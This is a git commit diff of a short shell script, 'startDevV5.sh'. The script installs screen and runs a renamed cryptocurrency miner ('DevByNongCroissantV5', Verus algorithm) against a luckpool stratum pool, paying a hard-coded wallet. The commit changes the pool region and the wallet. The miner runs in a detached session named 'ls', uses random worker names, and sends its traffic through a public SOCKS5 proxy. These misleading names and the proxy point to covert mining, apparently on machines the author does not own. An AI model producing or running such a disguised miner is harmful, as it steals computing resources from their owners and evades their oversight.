4e69402781e7d712c7b1f01f69656029c0c6e5ba
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-03 20:50:06 +0700

    Update startDevV5.sh

--- startDevV5.sh
+++ startDevV5.sh
@@ -1,9 +1,10 @@
+#!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
 chmod +x DevByNongCroissantV5
 screen -dmS ls 
-POOL=stratum+tcp://na.luckpool.net:3956
-WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
 WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
 PROXY=socks5://98.162.25.23:4145
 ./DevByNongCroissantV5 -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
